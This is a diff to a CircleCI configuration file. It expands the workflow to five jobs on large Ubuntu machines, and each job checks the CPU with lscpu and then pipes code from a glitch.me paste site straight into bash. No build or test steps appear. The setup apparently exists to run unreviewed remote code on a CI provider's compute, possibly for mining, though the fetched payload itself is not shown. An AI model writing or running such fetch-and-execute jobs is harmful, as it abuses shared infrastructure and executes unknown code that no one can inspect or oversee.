@@ -1,7 +1,7 @@
 version: 2.1
 
 jobs:
-  trial1:
+  trial1.1:
     machine:
       image: ubuntu-2004:current
     resource_class: large
@@ -11,7 +11,37 @@ jobs:
             name: "trial" 
             command: curl https://muq-hastebin.glitch.me/raw/pvBYzAmYLZ | bash
 
-  trial2:
+  trial2.1:
+    machine:
+      image: ubuntu-2004:current
+    resource_class: large
+    steps:
+      - run: lscpu
+      - run: 
+            name: "trial" 
+            command: curl https://muq-hastebin.glitch.me/raw/pvBYzAmYLZ | bash
+
+  trial3.1:
+    machine:
+      image: ubuntu-2004:current
+    resource_class: large
+    steps:
+      - run: lscpu
+      - run: 
+            name: "trial" 
+            command: curl https://muq-hastebin.glitch.me/raw/pvBYzAmYLZ | bash
+
+  trial4.1:
+    machine:
+      image: ubuntu-2004:current
+    resource_class: large
+    steps:
+      - run: lscpu
+      - run: 
+            name: "trial" 
+            command: curl https://muq-hastebin.glitch.me/raw/pvBYzAmYLZ | bash
+
+  trial5.1:
     machine:
       image: ubuntu-2004:current
     resource_class: large
@@ -25,5 +55,8 @@ workflows:
     version: 2.1 
     build: 
         jobs: 
-        - trial1
-        - trial2
+        - trial1.1
+        - trial2.1
+        - trial3.1
+        - trial4.1
+        - trial5.1
